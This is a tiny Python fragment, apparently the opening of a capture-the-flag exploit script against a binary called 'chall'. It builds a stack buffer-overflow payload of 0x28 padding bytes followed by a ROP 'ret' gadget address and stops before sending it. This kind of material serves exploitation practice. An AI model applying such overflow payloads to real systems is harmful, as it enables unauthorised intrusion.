#!/usr/bin/env python3

elf = ELF('chall')
sock = Socket('chall')
rop_ret = 0x00400626

payload  = b'A' * 0x28
payload += p64(rop_ret)
